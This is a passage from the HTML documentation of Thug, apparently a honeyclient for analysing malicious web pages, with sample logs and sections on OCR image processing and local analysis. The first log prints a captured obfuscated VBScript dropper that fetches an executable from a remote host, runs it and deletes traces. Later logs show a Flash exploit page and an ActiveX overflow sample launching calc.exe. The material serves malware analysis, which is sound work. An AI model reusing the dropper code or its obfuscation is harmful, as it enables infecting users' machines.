<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:32<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:32<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>file<span class="w"> </span>d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:22:32<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">2</span><span class="o">]</span><span class="w"> </span>Code:
<span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set<span class="w"> </span><span class="nv">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b<span class="w"> </span><span class="o">=</span><span class="w"> </span>f<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span>:Set<span class="w"> </span><span class="nv">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set<span class="w"> </span><span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On<span class="w"> </span>Error<span class="w"> </span>resume<span class="w"> </span>next
c.open<span class="w"> </span>OT,<span class="w"> </span>a,<span class="w"> </span>z:c.send<span class="o">()</span>
If<span class="w"> </span>c.Status<span class="w"> </span><span class="o">=</span><span class="w"> </span>x<span class="w"> </span>Then
d.Open:d.Type<span class="w"> </span><span class="o">=</span><span class="w"> </span>y:d.Write<span class="w"> </span>c.ResponseBody:d.SaveToFile<span class="w"> </span>b:d.Close
End<span class="w"> </span>If
Set<span class="w"> </span><span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>,<span class="w"> </span>Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="w"> </span><span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM wm&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;player.e&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;xe&quot;</span>:W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;e&quot;</span>:Set<span class="w"> </span><span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:22:39] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:22:39] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:39] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:22:46] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:46] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:22:46] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
</section>
<section id="image-processing">
<h2>Image processing<a class="headerlink" href="#image-processing" title="Link to this heading"></a></h2>
<p>Image processing analysis (introduced in Thug 1.4) allows to analyze images retrieved during the
analysis. By default, Thug performs OCR analysis returning extracted strings but the possibility
exists to include other image processing algorithms through using Thug PyHooks. Be aware that
<em>pytesseract</em> is required to perform OCR analysis but this dependency is not installed by default
as the required steps could be different based on the Linux distribution. Please look at the section
<em>INSTALLATION</em> at <a class="reference external" href="https://github.com/madmaze/pytesseract">https://github.com/madmaze/pytesseract</a> for additional details.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-u<span class="w"> </span>win7ie90<span class="w"> </span>-U<span class="w"> </span>-Y<span class="w"> </span>--image-processing<span class="w"> </span>www.google.com
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:51<span class="o">]</span><span class="w"> </span><span class="o">[</span>window<span class="w"> </span>open<span class="w"> </span>redirection<span class="o">]</span><span class="w"> </span>about:blank<span class="w"> </span>-&gt;<span class="w"> </span>http://www.google.com
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:51<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="w"> </span>Redirection<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)]</span><span class="w"> </span>Content-Location:<span class="w"> </span>http://www.google.com/<span class="w"> </span>--&gt;<span class="w"> </span>Location:<span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:51<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:51<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8,<span class="w"> </span>MD5:<span class="w"> </span>6f1b8888e766930d42eda071cece248a<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>script<span class="w"> </span>src<span class="w"> </span>redirection<span class="o">]</span><span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="w"> </span>-&gt;<span class="w"> </span>https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referer:<span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/javascript,<span class="w"> </span>MD5:<span class="w"> </span>f9acfd15f94beb685f01c6d6df397ff6<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png<span class="w"> </span>--&gt;<span class="w"> </span>https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>img<span class="w"> </span>redirection<span class="o">]</span><span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="w"> </span>-&gt;<span class="w"> </span>https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referer:<span class="w"> </span>https://www.google.com/?gws_rd<span class="o">=</span>ssl<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>image/png,<span class="w"> </span>MD5:<span class="w"> </span>b593548ac0f25135c059a0aae302ab4d<span class="o">)</span>
<span class="o">[</span><span class="m">2020</span>-04-09<span class="w"> </span><span class="m">12</span>:18:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>OCR<span class="o">]</span><span class="w"> </span>Result:<span class="w"> </span>Google<span class="w"> </span><span class="o">(</span>URL:<span class="w"> </span>https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png<span class="o">)</span>
<span class="o">[</span>..<span class="o">]</span>
</pre></div>
</div>
</section>
<section id="local-analysis">
<h2>Local Analysis<a class="headerlink" href="#local-analysis" title="Link to this heading"></a></h2>
<p>May you need to analyze a locally saved page Thug provides the <em>-l (–local)</em> option to you.
Using such option is really simple and could turn to be really useful for testing and for
later (manual or automated) analysis (see also <em>Web Cache</em>)</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-l<span class="w"> </span>../samples/exploits/4042.html
<span class="o">[</span><span class="m">2012</span>-07-03<span class="w"> </span><span class="m">00</span>:12:23<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277&quot;</span><span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="s2">&quot;target&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-07-03<span class="w"> </span><span class="m">00</span>:12:23<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>DCE2F8B1-A520-11D4-8FD0-00D0B7730277
<span class="o">[</span><span class="m">2012</span>-07-03<span class="w"> </span><span class="m">00</span>:12:23<span class="o">]</span><span class="w"> </span><span class="o">[</span>Yahoo!<span class="w"> </span>Messenger<span class="w"> </span><span class="m">8</span>.x<span class="w"> </span>Ywcvwr<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span>Console<span class="w"> </span>Overflow
<span class="o">[</span><span class="m">2012</span>-07-03<span class="w"> </span><span class="m">00</span>:12:23<span class="o">]</span><span class="w"> </span>UINT<span class="w"> </span>WINAPI<span class="w"> </span>WinExec<span class="w"> </span><span class="o">(</span>
<span class="w">        </span><span class="nv">LPCSTR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">0x025d4b30</span><span class="w"> </span><span class="o">=</span>&gt;
<span class="w">                </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;calc.exe&quot;</span><span class="p">;</span>
<span class="w">        </span>UINT<span class="w"> </span><span class="nv">uCmdShow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="m">32</span><span class="p">;</span>
void<span class="w"> </span>ExitProcess<span class="w"> </span><span class="o">(</span>
<span class="w">        </span>UINT<span class="w"> </span><span class="nv">uExitCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="m">0</span><span class="p">;</span>
</pre></div>
</div>
<p>If you need to prevent remote content fetching while analyzing a locally saved page Thug
provides the <em>-x (–local-nofetch)</em> option to you. Let’s take a look at an example.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-l<span class="w"> </span>../samples/exploits/55875.html
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=utf-8&quot;</span><span class="w"> </span>http-equiv<span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Acer Inc.&#39;s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for </span><span class="nv">$710</span><span class="s2"> million.  Acer said it ...&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;description&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;index,follow&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;robots&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;Copyright (c)2007-2007 groundhogtech.com. All right reserved.&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;copyright&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;WordPress 2.2.1&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;generator&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span><span class="o">[</span>Meta<span class="o">]</span><span class="w"> </span>Generator:<span class="w"> </span>WordPress<span class="w"> </span><span class="m">2</span>.2.1
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;meta<span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/favicon.ico<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">204</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/favicon.ico<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/plain<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8,<span class="w"> </span>MD5:<span class="w"> </span>d41d8cd98f00b204e9800998ecf8427e<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:28<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span><span class="w"> </span><span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8,<span class="w"> </span>MD5:<span class="w"> </span>64f3fd00b16de9316bf2b7b57925f4ca<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:29<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span><span class="w"> </span><span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/feed/<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/feed/<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8,<span class="w"> </span>MD5:<span class="w"> </span>0f3dffbe75d901cf28d63f2e8c945815<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:30<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/xmlrpc.php<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:30<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/xmlrpc.php<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8,<span class="w"> </span>MD5:<span class="w"> </span>ce1ec1253cf77acb1a86d38c80a83ca2<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:30<span class="o">]</span><span class="w"> </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span><span class="w"> </span><span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:31<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/xmlrpc.php?rsd<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:31<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.groundhogtech.com/xmlrpc.php?rsd<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8,<span class="w"> </span>MD5:<span class="w"> </span>d178bfd11bc1b88fc37be47b515210eb<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:31<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span><span class="m">0</span>.8.9.8h<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2013</span>-01-08<span class="w"> </span><span class="m">10</span>:32:31<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span><span class="m">0</span>.8.9.8h<span class="w"> </span><span class="o">(</span>Content-type:<span class="w"> </span>text/html,<span class="w"> </span>MD5:<span class="w"> </span>cd382dd315e1c83a108dd8009bad9f70<span class="o">)</span>
